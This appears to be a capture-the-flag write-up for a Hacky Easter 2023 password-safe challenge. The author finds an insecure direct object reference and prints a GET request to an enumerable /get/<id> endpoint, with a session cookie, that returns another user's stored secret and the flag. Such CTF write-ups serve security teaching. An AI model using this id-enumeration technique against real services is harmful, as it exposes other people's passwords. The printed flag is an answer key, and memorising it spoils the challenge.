# Description

# Igor's Gory Passwordsafe

You found the following letter:

Hi Peter

Thanks again for your help in cryptography to make the passwordsafe secure. Now

 - The passwords of the user are stored in a irreversible way (bcrypt)
 - All passwords in the safe are encrypted by a strong symmetric key

Kind regards, Roy

Open the passwordsafe at at <http://ch.hackyeaster.com:2312> to get your 🚩 flag.

Note: The service is restarted every hour at x:00.

## Hints

No brute forcing needed, really!

# Solution

so we got a website, where we can register a user and then store passwords, so i tried sql injections everywhere but nothing, then i tried to modify the passwords with the update functionality, since the password ids were enumerable, but i was only able to modfy the users passwords

after some time and monitoring everything with burp i found that there was a function `copy password` with that your password got copied to your clipboard, and at the same time a GET request was sent (also with the same enumerable id) which returned the password

so i tried to get other passwords from that endpoint, and it worked!

```
GET /get/7 HTTP/1.1
Host: ch.hackyeaster.com:2312
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://ch.hackyeaster.com:2312/show
Cookie: session=.eJwtzjEOwjAMBdC7ZGZw7NhJepkqTr4FElNLJ8TdYeAE773THgfOe9pex4Vb2h8rbckLeUSVYjOokGkUgc0quWkNYCzD6qjNdcjUySM38MAwFZLFqsuDW4dbIWLj3maNVVSUVhOK5lTgCyObcdYuxPhpgNUpPNIvcp04_pvn5Tl9vqIdMNs.ZDApBg.NecbzrpaBOZxR3_4bIkZVIqCvL0
```

gave the flag:

```
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.10.10
Date: Fri, 07 Apr 2023 14:39:27 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 41
Vary: Cookie
Connection: close

he2023{1d0R_c4n_d3str0y_ur_Crypt0_3ff0rt}
```

now the challenge name also makes sense to me!

# Flag: he2023{1d0R_c4n_d3str0y_ur_Crypt0_3ff0rt}
